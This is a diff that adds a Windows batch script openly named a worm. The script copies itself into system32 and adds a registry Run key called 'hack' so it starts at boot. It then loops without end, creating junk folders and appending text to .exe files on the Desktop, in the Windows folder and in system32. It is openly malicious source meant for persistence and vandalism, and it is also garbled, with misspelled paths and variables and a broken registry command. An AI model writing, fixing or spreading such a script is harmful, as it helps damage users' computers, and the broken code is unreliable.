@@ -1,0 +1,69 @@
+@echo off
+copy %windir%sysystem32worm.bat
+REG ADD
+HKLMsoftwaremicrosoftwindowscurrentsversionrun/v hack/d
+%windir%sysystem32worm.bat
+:worm
+cd
+cd %homepatch%
+cd escritorio
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+cd
+cd windows
+mkdir %ramdom%
+mkdir %ramdom%
+mkdir %ramdom%
+mkdir %ramdom%
+mkdir %ramdom%
+mkdir %ramdom%
+mkdir %ramdom%
+mkdir %ramdom%
+mkdir %ramdom%
+mkdir %ramdom%
+mkdir %ramdom%
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+cd systeme32
+mkdir %ramdom%
+mkdir %ramdom%
+mkdir %ramdom%
+mkdir %ramdom%
+mkdir %ramdom%
+mkdir %ramdom%
+mkdir %ramdom%
+mkdir %ramdom%
+mkdir %ramdom%
+mkdir %ramdom%
+mkdir %ramdom%
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+echo worm >> %amdom%.exe
+goto worm
+
